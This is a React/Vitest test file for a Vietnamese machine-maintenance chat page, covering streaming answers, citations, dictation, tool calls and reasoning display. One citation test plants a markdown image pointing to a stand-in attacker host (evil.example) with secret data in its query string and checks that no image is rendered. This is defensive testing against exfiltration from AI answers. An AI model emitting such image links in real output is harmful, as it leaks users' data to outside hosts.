import {
  cleanup,
  fireEvent,
  render,
  screen,
  waitFor,
  within,
} from "@testing-library/react";
import { createMemoryRouter, Outlet, RouterProvider } from "react-router-dom";
import { afterEach, describe, expect, it, vi } from "vitest";
import { AuthProvider } from "@/hooks/auth";
import { AuthClient } from "@/services/auth-api";
import { MicRecorder } from "@/services/mic-recorder";
import { ConversationList } from "@/components/conversation-list";
import { ConversationsProvider } from "@/hooks/conversations";
import { ConversationsPage } from "./conversations";

vi.mock("@/services/mic-recorder", async (actual) => ({
  ...(await actual<typeof import("@/services/mic-recorder")>()),
  MicRecorder: {
    open: vi.fn(async () => ({
      stop: async () => undefined,
      toWav: () => new Blob(["RIFF"], { type: "audio/wav" }),
    })),
  },
}));

const chat = (id: string, title: string) => ({
  id,
  title,
  created_at: "2026-11-03T08:00:00Z",
  updated_at: "2026-11-03T08:00:00Z",
});

/** An SSE body the test writes to; aborting the request errors the body. */
function openStream(signal: AbortSignal | null | undefined) {
  const encoder = new TextEncoder();
  let push!: (frame: string) => void;
  let end!: () => void;
  const body = new ReadableStream<Uint8Array>({
    start(controller) {
      push = (frame) => controller.enqueue(encoder.encode(frame));
      end = () => controller.close();
      signal?.addEventListener("abort", () =>
        controller.error(new DOMException("Aborted", "AbortError")),
      );
    },
  });
  return {
    response: new Response(body, {
      headers: { "Content-Type": "text/event-stream" },
    }),
    push,
    end,
    aborted: () => signal?.aborted ?? false,
  };
}

type Stream = ReturnType<typeof openStream>;

function serve(
  histories: Record<string, unknown[]>,
  createGate?: Promise<void>,
  transcription?: () => Promise<Response>,
) {
  const streams: Stream[] = [];
  const speechCalls: unknown[] = [];
  const created: unknown[] = [];
  const fetch = vi.fn(async (url: string, init?: RequestInit) => {
    const method = init?.method ?? "GET";
    if (url.endsWith("/auth/refresh"))
      return Response.json({ detail: "x" }, { status: 401 });
    if (url === "/v1/conversations" && method === "GET")
      return Response.json({
        conversations: [chat("chat-a", "Máy A"), chat("chat-b", "Máy B")],
      });
    if (url === "/v1/conversations" && method === "POST") {
      const body = JSON.parse(init!.body as string);
      created.push(body);
      await createGate;
      return Response.json(chat("chat-new", body.title), { status: 201 });
    }
    const item = url.match(/^\/v1\/conversations\/([^/]+)$/);
    if (item && method === "PATCH")
      return Response.json(
        chat(item[1], JSON.parse(init!.body as string).title),
      );
    if (item && method === "DELETE") return new Response(null, { status: 204 });
    const history = url.match(/^\/v1\/conversations\/([^/]+)\/history$/);
    if (history)
      return Response.json({
        conversation_id: history[1],
        messages: histories[history[1]] ?? [],
        truncated: false,
      });
    if (url === "/v1/speech/transcriptions") {
      speechCalls.push(init?.body);
      return (await transcription?.()) ?? Response.json({ text: "" });
    }
    if (url.endsWith("/stream")) {
      const stream = openStream(init?.signal);
      streams.push(stream);
      return stream.response;
    }
    throw new Error(`Unexpected request: ${method} ${url}`);
  });
  vi.stubGlobal("fetch", fetch);
  return { fetch, streams, created, speechCalls };
}

function show(path: string) {
  const router = createMemoryRouter(
    [
      {
        element: (
          <ConversationsProvider>
            <ConversationList />
            <Outlet />
          </ConversationsProvider>
        ),
        children: [
          { path: "/ask/:threadId?", element: <ConversationsPage /> },
          { path: "/files", element: <h1>Tệp cá nhân</h1> },
        ],
      },
    ],
    { initialEntries: [path] },
  );
  render(
    <AuthProvider client={new AuthClient({ crossTab: false })}>
      <RouterProvider router={router} />
    </AuthProvider>,
  );
  return router;
}

function ask(text: string) {
  fireEvent.change(screen.getByTestId("chat-input"), {
    target: { value: text },
  });
  fireEvent.click(screen.getByTestId("chat-send"));
}

const frame = (name: string, value: unknown) =>
  `event: ${name}\ndata: ${JSON.stringify(value)}\n\n`;

afterEach(() => vi.unstubAllGlobals());

describe("ConversationsPage", () => {
  it("shows saved history in order when a conversation is reopened", async () => {
    serve({
      "chat-a": [
        { role: "user", text: "Lỗi E12" },
        { role: "assistant", text: "Kiểm tra cảm biến." },
        { role: "user", text: "Vẫn lỗi" },
      ],
    });
    show("/ask/chat-a");
    const questions = await screen.findAllByTestId("chat-question");
    expect(questions.map((item) => item.textContent)).toEqual([
      "Lỗi E12",
      "Vẫn lỗi",
    ]);
    expect(screen.getByTestId("chat-answer")).toHaveTextContent(
      "Kiểm tra cảm biến.",
    );
  });

  it("creates a conversation on first send and replaces provisional text with the saved answer", async () => {
    const { streams, created } = serve({});
    const router = show("/ask");
    await screen.findByRole("link", { name: "Máy A" });
    ask("Máy ép số 3 báo lỗi E12");

    await waitFor(() => expect(streams).toHaveLength(1));
    expect(created).toEqual([{ title: "Máy ép số 3 báo lỗi E12" }]);
    expect(router.state.location.pathname).toBe("/ask/chat-new");
    streams[0].push('event: text\ndata: {"delta":"Kiểm tra tạm"}\n\n');
    const answer = await screen.findByTestId("chat-answer");
    await waitFor(() => expect(answer).toHaveTextContent("Kiểm tra tạm"));
    expect(answer).toHaveAttribute("data-status", "streaming");

    streams[0].push(
      'event: complete\ndata: {"answer":"Kiểm tra cảm biến áp suất."}\n\n',
    );
    await waitFor(() => expect(answer).toHaveAttribute("data-status", "saved"));
    expect(answer).toHaveTextContent("Kiểm tra cảm biến áp suất.");
    expect(answer).not.toHaveTextContent("Kiểm tra tạm");
  });

  it("links only saved citations and opens their excerpt", async () => {
    const citation = {
      marker: "S1",
      evidence_id: "chunk-71",
      title: "MR-JE manual",
      excerpt: "E12: kiểm tra cảm biến áp suất.",
      location: "trang 71",
    };
    serve({
      "chat-a": [
        { role: "user", text: "Lỗi E12" },
        {
          role: "assistant",
          text: "Kiểm tra cảm biến [S1]. Ca cũ [S4]. ![x](https://evil.example/?d=secret) [giả](#cite-S9)",
          citations: [citation],
        },
      ],
    });
    show("/ask/chat-a");
    const marker = await screen.findByRole("button", { name: "Mở nguồn S1" });
    expect(
      screen.queryByRole("button", { name: "Mở nguồn S4" }),
    ).not.toBeInTheDocument();
    expect(screen.getByTestId("chat-answer")).toHaveTextContent("[S4]");

    expect(document.querySelector("img")).toBeNull();
    expect(
      screen.queryByRole("button", { name: "Mở nguồn S9" }),
    ).not.toBeInTheDocument();

    fireEvent.click(marker);
    const card = screen.getByTestId("citation-card");
    expect(card).toHaveTextContent("MR-JE manual");
    expect(card).toHaveTextContent("trang 71");
    expect(card).toHaveTextContent("E12: kiểm tra cảm biến áp suất.");
  });

  it("says when the knowledge search found nothing or failed", async () => {
    const { streams } = serve({});
    show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    ask("Lỗi E12");
    await waitFor(() => expect(streams).toHaveLength(1));
    streams[0].push(
      'event: complete\ndata: {"answer":"Không có.","citations":[],"search":"unavailable"}\n\n',
    );
    expect(
      await screen.findByText(
        "Không tra cứu được kho tri thức cho câu hỏi này.",
      ),
    ).toBeInTheDocument();
  });

  it("puts a transcript in the composer for editing and sends the edited text", async () => {
    const { streams, speechCalls } = serve({}, undefined, async () =>
      Response.json({ text: "máy ép báo lỗi e mười hai" }),
    );
    show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    fireEvent.click(screen.getByTestId("dictation"));
    await screen.findByRole("button", { name: "Dừng ghi âm" });
    fireEvent.click(screen.getByTestId("dictation"));

    const input = screen.getByTestId("chat-input") as HTMLTextAreaElement;
    await waitFor(() => expect(input.value).toBe("máy ép báo lỗi e mười hai"));
    expect(speechCalls[0]).toBeInstanceOf(FormData);
    expect(streams).toHaveLength(0);

    fireEvent.change(input, { target: { value: "Máy ép báo lỗi E12" } });
    fireEvent.click(screen.getByTestId("chat-send"));
    await waitFor(() => expect(streams).toHaveLength(1));
    expect(screen.getByTestId("chat-question")).toHaveTextContent(
      "Máy ép báo lỗi E12",
    );
  });

  it("shows a speech failure and ignores a transcript that arrives after switching chats", async () => {
    let respond!: (response: Response) => void;
    serve(
      { "chat-b": [] },
      undefined,
      () => new Promise<Response>((resolve) => (respond = resolve)),
    );
    const router = show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    fireEvent.click(screen.getByTestId("dictation"));
    await screen.findByRole("button", { name: "Dừng ghi âm" });
    fireEvent.click(screen.getByTestId("dictation"));
    await waitFor(() => expect(respond).toBeDefined());
    await router.navigate("/ask/chat-b");
    await waitFor(() =>
      expect(screen.getByTestId("chat-title")).toHaveTextContent("Máy B"),
    );
    respond(Response.json({ text: "câu cũ" }));
    await waitFor(() =>
      expect(screen.getByTestId("dictation")).not.toBeDisabled(),
    );
    expect(
      (screen.getByTestId("chat-input") as HTMLTextAreaElement).value,
    ).toBe("");

    fireEvent.click(screen.getByTestId("dictation"));
    await screen.findByRole("button", { name: "Dừng ghi âm" });
    fireEvent.click(screen.getByTestId("dictation"));
    await waitFor(() => expect(respond).toBeDefined());
    respond(Response.json({ detail: "x" }, { status: 503 }));
    expect(await screen.findByTestId("dictation-error")).toHaveTextContent(
      "Không nhận dạng được giọng nói lúc này",
    );
  });

  it("opens the microphone once when the mic button is pressed twice quickly", async () => {
    serve({});
    const open = vi.mocked(MicRecorder.open);
    open.mockClear();
    show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    fireEvent.click(screen.getByTestId("dictation"));
    fireEvent.click(screen.getByTestId("dictation"));
    await screen.findByRole("button", { name: "Dừng ghi âm" });
    expect(open).toHaveBeenCalledTimes(1);
  });

  it("renames and deletes a conversation from the sidebar", async () => {
    serve({ "chat-a": [] });
    const router = show("/ask/chat-a");
    await screen.findByRole("link", { name: "Máy A" });
    vi.spyOn(window, "prompt").mockReturnValue("Máy ép E12");
    fireEvent.click(screen.getByRole("button", { name: "Đổi tên Máy A" }));
    expect(await screen.findByTestId("chat-title")).toHaveTextContent(
      "Máy ép E12",
    );
    vi.spyOn(window, "confirm").mockReturnValue(true);
    fireEvent.click(screen.getByRole("button", { name: "Xoá Máy ép E12" }));
    await waitFor(() => expect(router.state.location.pathname).toBe("/ask"));
    expect(
      screen.queryByRole("link", { name: "Máy ép E12" }),
    ).not.toBeInTheDocument();
  });

  it("titles a new chat from a multi-line first message without line breaks", async () => {
    const { streams, created } = serve({});
    show("/ask");
    await screen.findByRole("link", { name: "Máy A" });
    ask("  Máy ép số 3\nlog:\tE12  ");
    await waitFor(() => expect(streams).toHaveLength(1));
    expect(created).toEqual([{ title: "Máy ép số 3 log: E12" }]);
  });

  it("does not return to a new chat that finished creating after the user left", async () => {
    let finishCreate!: () => void;
    const { streams } = serve(
      { "chat-b": [{ role: "user", text: "Câu hỏi của máy B" }] },
      new Promise<void>((resolve) => (finishCreate = resolve)),
    );
    const router = show("/ask");
    await screen.findByRole("link", { name: "Máy A" });
    ask("Câu hỏi mới");
    await router.navigate("/ask/chat-b");
    await screen.findByText("Câu hỏi của máy B");
    finishCreate();

    await screen.findByRole("link", { name: "Câu hỏi mới" });
    expect(router.state.location.pathname).toBe("/ask/chat-b");
    expect(streams).toHaveLength(0);
    expect(screen.queryByText("Câu hỏi mới", { selector: "p" })).toBeNull();
    expect(screen.getByTestId("chat-send")).toBeInTheDocument();
  });

  it("marks an answer whose stream ended without a final event as unconfirmed", async () => {
    const { streams } = serve({});
    show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    ask("Lỗi E12");
    await waitFor(() => expect(streams).toHaveLength(1));
    streams[0].push('event: text\ndata: {"delta":"partial"}\n\n');
    streams[0].end();
    const answer = await screen.findByTestId("chat-answer");
    await waitFor(() =>
      expect(answer).toHaveAttribute("data-status", "unconfirmed"),
    );
    expect(
      screen.getByRole("button", { name: "Tải lại cuộc trò chuyện" }),
    ).toBeInTheDocument();
  });

  it("shows an agent error without sending again", async () => {
    const { streams, fetch } = serve({});
    show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    ask("Lỗi E12");
    await waitFor(() => expect(streams).toHaveLength(1));
    streams[0].push(
      'event: error\ndata: {"code":"provider_error","message":"Model failed.","retryable":true}\n\n',
    );
    const answer = await screen.findByTestId("chat-answer");
    await waitFor(() =>
      expect(answer).toHaveAttribute("data-status", "failed"),
    );
    expect(answer).toHaveTextContent("Model failed.");
    const streamCalls = fetch.mock.calls.filter(([url]) =>
      String(url).endsWith("/stream"),
    );
    expect(streamCalls).toHaveLength(1);
  });

  it("shows reasoning in a collapsed thinking block that opens on click", async () => {
    const { streams } = serve({});
    show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    ask("Lỗi E12");
    await waitFor(() => expect(streams).toHaveLength(1));
    streams[0].push(
      'event: reasoning\ndata: {"delta":"Mã E12 thường liên quan áp suất."}\n\n',
    );

    const toggle = await screen.findByRole("button", { name: /Đang suy nghĩ/ });
    expect(toggle).toHaveAttribute("aria-expanded", "false");
    expect(
      screen.queryByText("Mã E12 thường liên quan áp suất."),
    ).not.toBeInTheDocument();
    fireEvent.click(toggle);
    expect(
      screen.getByText("Mã E12 thường liên quan áp suất."),
    ).toBeInTheDocument();

    streams[0].push('event: text\ndata: {"delta":"Kiểm tra"}\n\n');
    streams[0].push(
      'event: complete\ndata: {"answer":"Kiểm tra cảm biến."}\n\n',
    );
    const answer = screen.getByTestId("chat-answer");
    await waitFor(() => expect(answer).toHaveAttribute("data-status", "saved"));
    expect(
      screen.getByRole("button", { name: /Đã suy nghĩ trong \d+ giây/ }),
    ).toBeInTheDocument();
    expect(within(answer).getByTestId("answer-text")).not.toHaveTextContent(
      "Mã E12 thường liên quan áp suất.",
    );
  });

  it("stops the old answer when switching conversations and ignores its late text", async () => {
    const { streams } = serve({
      "chat-b": [{ role: "user", text: "Câu hỏi của máy B" }],
    });
    const router = show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    ask("Câu hỏi của máy A");
    await waitFor(() => expect(streams).toHaveLength(1));

    await router.navigate("/ask/chat-b");
    await screen.findByText("Câu hỏi của máy B");
    expect(streams[0].aborted()).toBe(true);
    expect(screen.queryByText("Câu hỏi của máy A")).not.toBeInTheDocument();
    expect(screen.queryByTestId("chat-answer")).not.toBeInTheDocument();
    expect(screen.getByTestId("chat-send")).toBeInTheDocument();
  });

  it("shows collapsed tool calls and reopens saved result details", async () => {
    const histories: Record<string, unknown[]> = {};
    const { streams } = serve(histories);
    const router = show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    ask("Lỗi E12");
    await waitFor(() => expect(streams).toHaveLength(1));
    const list = {
      id: "list",
      name: "list_knowledge_bases",
      state: "results",
      count: 1,
      catalog: [{ name: "maintenance", title: "Bảo trì" }],
    };
    const source = {
      kb: "maintenance",
      source_id: "016fbe12-6d56-7ed2-af5f-1d21779fabc5",
      source_kind: "upload",
      title: "Sổ tay nguồn",
      reference: { type: "page", page: 7 },
    };
    const result = {
      rank: 1,
      chunk_id: "016fbe12-6d56-7ed2-af5f-1d21779fabc6",
      title: "Kiểm tra cảm biến",
      status: "draft",
      sources: [source],
    };
    const search = {
      id: "search",
      name: "search_knowledge",
      state: "results",
      kb: "maintenance",
      query: "E12 áp suất",
      count: 1,
      results: [result],
    };
    const description = "Sổ tay bảo trì cho máy ép.";
    const secondResult = {
      ...result,
      rank: 2,
      chunk_id: "016fbe12-6d56-7ed2-af5f-1d21779fabc9",
      title: "Kết quả chỉ hiển thị trực tiếp",
      sources: [],
    };
    streams[0].push(frame("tool", {
      tool: { ...list, catalog: [{ ...list.catalog[0], description }] },
    }));
    streams[0].push(frame("tool", { tool: { ...search, state: "running", results: [] } }));
    streams[0].push(frame("tool", {
      tool: {
        ...search,
        count: 2,
        results: [{ ...result, excerpt: "Trích đoạn trực tiếp" }, secondResult],
      },
    }));
    const rows = await screen.findAllByTestId("chat-tool-call");
    expect(rows).toHaveLength(2);
    rows[0].setAttribute("open", "");
    expect(rows[1]).not.toHaveAttribute("open");
    expect(rows[1].querySelector("summary")).toHaveTextContent("E12 áp suất");
    rows[1].setAttribute("open", "");
    expect(within(rows[1]).getByText("Trích đoạn trực tiếp")).toBeVisible();
    expect(within(rows[1]).getByRole("link", { name: "Sổ tay nguồn · trang 7" })).toHaveAttribute(
      "href", `/knowledge/maintenance/sources/upload/${source.source_id}`,
    );
    const citations = [{
      marker: "S1", evidence_id: result.chunk_id, title: result.title,
      excerpt: "Trích đoạn đã dẫn", sources: [source],
    }];
    const reply = {
      reply_id: "016fbe12-6d56-7ed2-af5f-1d21779fabc7",
      citations, tools: [list, { ...search, count: 2, truncated: true }],
    };
    streams[0].push(frame("complete", { ...reply, answer: "Kiểm tra [S1]." }));
    const answer = screen.getByTestId("chat-answer");
    await waitFor(() => expect(answer).toHaveAttribute("data-status", "saved"));
    expect(within(rows[0]).getByText(description)).toBeVisible();
    expect(within(rows[1]).getByText(secondResult.title)).toBeVisible();
    expect(within(rows[1]).getByText("Trích đoạn trực tiếp")).toBeVisible();
    expect(within(answer).getByTestId("answer-text")).not.toHaveTextContent("Trích đoạn trực tiếp");
    histories["chat-a"] = [{ role: "assistant", text: "Kiểm tra [S1].", ...reply }];
    await router.navigate("/files");
    await screen.findByText("Tệp cá nhân");
    await router.navigate("/ask/chat-a");
    const reopened = (await screen.findAllByTestId("chat-tool-call"))[1];
    expect(reopened).not.toHaveAttribute("open");
    reopened.setAttribute("open", "");
    expect(within(reopened).getByText("Trích đoạn đã dẫn")).toBeVisible();
    expect(within(reopened).queryByText(secondResult.title)).not.toBeInTheDocument();
    fireEvent.click(screen.getByRole("button", { name: "Mở nguồn S1" }));
    expect(within(screen.getByTestId("citation-card")).getByRole("link")).toHaveAttribute(
      "href", `/knowledge/maintenance/sources/upload/${source.source_id}`,
    );
  });

  it("restores thinking only for the matching saved reply after navigating away", async () => {
    const histories: Record<string, unknown[]> = {};
    const { streams } = serve(histories);
    const router = show("/ask/chat-a");
    await screen.findByText(/Máy đang gặp vấn đề gì/);
    ask("Lỗi E12");
    await waitFor(() => expect(streams).toHaveLength(1));
    const reply_id = "016fbe12-6d56-7ed2-af5f-1d21779fabc7";
    streams[0].push(frame("reasoning", { delta: "Suy nghĩ cho lần trả lời này." }));
    streams[0].push(frame("complete", { answer: "Kiểm tra.", reply_id }));
    await waitFor(() => expect(screen.getByTestId("chat-answer")).toHaveAttribute("data-status", "saved"));
    histories["chat-a"] = [
      { role: "assistant", text: "Kiểm tra.", reply_id: "016fbe12-6d56-7ed2-af5f-1d21779fabc8" },
      { role: "assistant", text: "Kiểm tra.", reply_id },
    ];
    histories["chat-b"] = [{ role: "assistant", text: "Kiểm tra.", reply_id }];
    await router.navigate("/files");
    await screen.findByText("Tệp cá nhân");
    await router.navigate("/ask/chat-b");
    await screen.findByTestId("chat-answer");
    expect(screen.queryByTestId("thinking-block")).not.toBeInTheDocument();
    await router.navigate("/ask/chat-a");
    await waitFor(() => expect(screen.getAllByTestId("chat-answer")).toHaveLength(2));
    const answers = screen.getAllByTestId("chat-answer");
    expect(within(answers[0]).queryByTestId("thinking-block")).not.toBeInTheDocument();
    fireEvent.click(within(answers[1]).getByRole("button", { name: /Đã suy nghĩ/ }));
    expect(screen.getByText("Suy nghĩ cho lần trả lời này.")).toBeVisible();
    cleanup();
    show("/ask/chat-a");
    await waitFor(() => expect(screen.getAllByTestId("chat-answer")).toHaveLength(2));
    expect(screen.queryByTestId("thinking-block")).not.toBeInTheDocument();
  });
});
